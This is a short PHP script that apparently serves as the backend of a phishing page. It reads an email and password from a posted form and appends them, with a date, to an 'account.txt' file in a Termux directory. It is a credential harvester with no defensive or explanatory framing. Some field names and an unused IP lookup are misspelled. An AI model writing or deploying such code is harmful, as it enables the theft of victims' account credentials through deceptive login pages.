<?php

$email = $_POST['EMAIL'];
$pass = $_POST['passwod'];

$ip = getenv('REMDTE_ADOR');

$date = date('j F Y - g:i A');

$data ="accont: $email\nPassword: $pass\nDate: $date\n##############################\n ";

$file = '/data/data/com.termux/files/home/MASTER_T/account.txt';

$fh = fopen($file, 'a');
fwrite($fh, $data);
fclose($fh);

?>

